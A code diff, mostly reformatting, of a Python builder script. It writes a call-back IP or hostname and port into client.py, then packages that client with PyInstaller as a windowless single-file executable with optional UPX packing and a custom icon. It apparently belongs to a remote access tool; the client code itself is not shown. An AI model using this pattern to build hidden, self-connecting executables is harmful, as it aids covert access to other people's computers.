@@ -1,8 +1,10 @@
-import os, sys, socket, shutil
+import os
+import sys
+import socket
+import shutil
 
 # get the path to python install dir
 python_path = "\"" + os.path.dirname(sys.executable)
-
 try:
     # create a dummy socket to get local IP address
     objSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -82,16 +84,19 @@ if strChoice == "2" or strChoice == "1":
         # check for the first occurrence of the host
         if arrFileContents[intCounter][0:9] == "strHost =" or arrFileContents[intCounter][0:11] == "# strHost =":
             # set strHost to be the IP
-            arrFileContents[intCounter] = "strHost = \"" + strCurrentIP + "\"" + "\n"
+            arrFileContents[intCounter] = "strHost = \"" + \
+                strCurrentIP + "\"" + "\n"
             # comment out the line below used for DNS
-            arrFileContents[intCounter + 1] = "# strHost = socket.gethostbyname(\"\")" + "\n"
+            arrFileContents[intCounter +
+                            1] = "# strHost = socket.gethostbyname(\"\")" + "\n"
             # break for the first occurrence
             break
 else:
     for intCounter in range(0, len(arrFileContents)):
         if arrFileContents[intCounter][0:9] == "strHost =" or arrFileContents[intCounter][0:11] == "# strHost =":
             arrFileContents[intCounter] = "# strHost = \"\"" + "\n"
-            arrFileContents[intCounter + 1] = "strHost = socket.gethostbyname(\"" + strDNSHostname + "\")" + "\n"
+            arrFileContents[intCounter +
+                            1] = "strHost = socket.gethostbyname(\"" + strDNSHostname + "\")" + "\n"
             break
 
 if strPort != "":
@@ -105,7 +110,8 @@ objClientFile = open("client.py", "w")
 objClientFile.writelines(arrFileContents)
 objClientFile.close()
 
-strUPXChoice = input("\n" + "Use UPX? y/n (Decreases file size but may not work on fresh computers): ")
+strUPXChoice = input(
+    "\n" + "Use UPX? y/n (Decreases file size but may not work on fresh computers): ")
 
 if strUPXChoice == "y":
     strUPX = ""
@@ -124,10 +130,11 @@ strIconChoice = input("\n" + "Path for icon (Press ENTER to skip): ")
 strIconChoice = strIconChoice.replace("\"", "")
 
 # if the user did not choose an icon build the client using pyinstaller
+# pyinstaller should be in the path, no need for path to exe
 if strIconChoice == "":
-    os.system(python_path + "/Scripts/pyinstaller\" client.py " + strUPX + " --exclude-module FixTk --exclude-module tcl --exclude-module tk "
-                      "--exclude-module _tkinter --exclude-module tkinter --exclude-module Tkinter "
-                      "--onefile --windowed")
+    os.system("pyinstaller client.py " + strUPX + " --exclude-module FixTk --exclude-module tcl --exclude-module tk "
+              "--exclude-module _tkinter --exclude-module tkinter --exclude-module Tkinter "
+              "--onefile --windowed")
 # check to make sure the icon exists and that it is a .ico file
 elif not os.path.isfile(strIconChoice):
     print("Invalid path!")
@@ -137,6 +144,6 @@ elif not strIconChoice.endswith(".ico"):
     sys.exit(0)
 else:
     # build the client with an icon
-    os.system(python_path + "/Scripts/pyinstaller\" client.py " + strUPX + " --exclude-module FixTk --exclude-module tcl --exclude-module tk "
-                      "--exclude-module _tkinter --exclude-module tkinter --exclude-module Tkinter "
-                      "--onefile --windowed --icon=\"" + strIconChoice + "\"")
+    os.system("pyinstaller client.py " + strUPX + " --exclude-module FixTk --exclude-module tcl --exclude-module tk "
+              "--exclude-module _tkinter --exclude-module tkinter --exclude-module Tkinter "
+              "--onefile --windowed --icon=\"" + strIconChoice + "\"")
